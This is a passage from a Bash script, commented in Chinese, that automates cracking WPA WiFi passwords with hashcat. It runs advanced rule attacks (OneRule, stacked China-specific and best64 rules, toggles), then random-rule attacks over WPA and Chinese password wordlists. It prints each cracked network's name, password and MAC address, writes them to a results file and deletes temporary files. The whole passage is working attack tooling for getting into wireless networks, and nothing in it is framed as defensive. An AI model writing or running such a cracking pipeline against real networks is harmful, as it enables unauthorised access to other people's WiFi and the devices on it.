# 短词 + 数字后缀
[ -f "${SHORT_DICT}" ] && [ -f "${NUM_SUFFIX}" ] && {
    run_combinator "短词+数字后缀" "${SHORT_DICT}" "${NUM_SUFFIX}"
}

# ──────────────────────────────────────
# 阶段8: 高级规则 (OneRule/dive + multi-rule堆叠)
# 适合: 字典词经过复杂变换后的强密码
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段8: 高级规则攻击 <<<<<<"
# OneRuleToRuleThemAll / dive.rule (如果存在)
if [ -n "${RULE_ONERULE}" ]; then
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/11-wpa-sec.txt" \
              "${DICT_DIR}/probable-wpa.txt"; do
        [ -f "$df" ] || continue
        run_dict_rule "$(basename "$df")+$(basename "${RULE_ONERULE}")" "$df" "${RULE_ONERULE}"
    done
fi
# 多规则堆叠: china-wifi.rule x best64.rule (乘法效应)
if [ -f "${RULE_CHINA}" ] && [ -n "${RULE_BEST64}" ]; then
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/probable-wpa.txt"; do
        [ -f "$df" ] || continue
        run_dict_multi_rule "$(basename "$df")+中国规则x best64" "$df" "${RULE_CHINA}" "${RULE_BEST64}"
    done
fi
# toggles 规则 (大小写穷举)
if [ -n "${RULE_TOGGLES}" ]; then
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/probable-wpa.txt"; do
        [ -f "$df" ] || continue
        run_dict_rule "$(basename "$df")+toggles" "$df" "${RULE_TOGGLES}"
    done
fi

# ──────────────────────────────────────
# 阶段9: 随机规则生成 (hashcat独有, 最后手段)
# 生成大量随机规则变换, 概率性命中强密码
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段9: 随机规则生成 <<<<<<"
for df in "${DICT_DIR}/wpa-top4800.txt" \
          "${DICT_DIR}/11-wpa-sec.txt" \
          "${DICT_DIR}/probable-wpa.txt" \
          "${DICT_DIR}/cn-top100w.txt"; do
    [ -f "$df" ] || continue
    bname=$(basename "$df" .txt)
    # 1万条随机规则, 每条1-3个函数操作
    run_random_rules "${bname}+1万随机规则(1-3函数)" "$df" 10000 1 3
    # 5千条随机规则, 每条3-5个函数操作 (更激进)
    run_random_rules "${bname}+5千随机规则(3-5函数)" "$df" 5000 3 5
done

# ============================================================================
# 最终结果
# ============================================================================
END_TIME=$(date +%s)
ELAPSED=$(( (END_TIME - START_TIME) / 60 ))

echo ""
echo "============================================"
echo "  全部完成 | 总耗时: ${ELAPSED} 分钟"
echo "============================================"

RESULT_FILE="${WORK_DIR}/wifi_passwords.txt"
> "${RESULT_FILE}"

CRACKED_CNT=0
[ -f "${POTFILE}" ] && [ -s "${POTFILE}" ] && \
    CRACKED_CNT=$( ${HASHCAT} -m 22000 ${HASHES} --potfile-path ${POTFILE} --show 2>/dev/null | grep -c "^WPA\*" )

if [ "$CRACKED_CNT" -gt 0 ]; then
    echo ""
    echo "  ╔════════════════════════════════════════╗"
    echo "  ║    破解成功: ${CRACKED_CNT} 个 WiFi                  ║"
    echo "  ╠════════════════════════════════════════╣"
    ${HASHCAT} -m 22000 ${HASHES} --potfile-path ${POTFILE} --show 2>/dev/null | while IFS=: read hash pw; do
        bssid=$(echo "$hash" | cut -d'*' -f4)
        ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
        mac=$(echo "$bssid" | sed 's/\(..\)/\1:/g; s/:$//')
        echo "  ║"
        echo "  ║  WiFi: ${ssid}"
        echo "  ║  密码: ${pw}"
        echo "  ║  MAC:  ${mac}"
        echo "  ║"
        echo "WiFi: ${ssid}" >> "${RESULT_FILE}"
        echo "密码: ${pw}" >> "${RESULT_FILE}"
        echo "MAC:  ${mac}" >> "${RESULT_FILE}"
        echo "" >> "${RESULT_FILE}"
    done
    echo "  ╚════════════════════════════════════════╝"
    echo ""
    echo "  结果已保存: ${RESULT_FILE}"
    echo ""
    echo "  ── 快速复制 ──"
    cat "${RESULT_FILE}"
else
    echo ""
    echo "  未破解任何密码"
    echo "  建议: 密码较复杂，可尝试更多规则组合"
fi

# ── 清理临时文件 ──
echo ""
echo "  清理临时文件..."
rm -f "${WORK_DIR}"/filtered_*.txt 2>/dev/null
rm -f "${WORK_DIR}"/hybrid_*.txt 2>/dev/null
rm -f "${WORK_DIR}"/hybrid_md_*.txt 2>/dev/null
rm -f "${WORK_DIR}/short_words.txt" 2>/dev/null
rm -f "${WORK_DIR}/num_suffix.txt" 2>/dev/null
rm -f "${WORK_DIR}/name_short.txt" 2>/dev/null
echo "  清理完成"
echo ""
